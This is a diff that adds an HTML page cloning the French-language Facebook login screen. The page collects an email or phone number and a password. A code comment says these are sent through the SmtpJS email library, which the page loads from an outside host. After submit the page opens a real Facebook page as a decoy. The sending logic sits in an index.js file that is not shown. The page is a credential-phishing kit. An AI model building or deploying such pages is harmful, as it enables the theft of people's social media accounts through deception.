@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html long="en">
+<head>
+    <meta charset="UFT-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+     <!-- logo-->
+     <link rel="icon" href="image/12.icon">
+    <!-- css-->
+    <link rel="stylesheet" href="style.css">
+    <!--sent name ou pass smtp.js-->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <!--open-->
+    <script>
+        function sent() {
+            window.open("https://web.facebook.com/snap.morocco")
+        }
+    </script>
+</head>
+<body>
+        <div class="container">
+        <div class="content">
+            <img src="image/11.png" alt="">
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="form-parent">
+            <form action="#" class="form-contact">
+                <input type="text" placeholder="Adresse e-mail ou numero de tel" name="subject" id="name">
+                <input type="text" placeholder="Mot de passe" id="pass">
+                <input type="submit" value="Se connect" class="login-btn" id="submit" onclick="sent()">
+                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget-link">
+                    Mot de passe oublie ?
+                </a>
+                <hr>
+                <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="btn">
+                    Creer nouveau compte
+                </a>
+            </form>
+            <p>
+                <a href="https://web.facebook.com/pages/create/?ref_type=registration_form">
+                    Creer une Page
+                </a>
+                pour une celebrite, une marque ou une entreprise.
+            </p>
+        </div>
+        </div>
+        <script src="./index.js"></script>
+</body>
+</html>
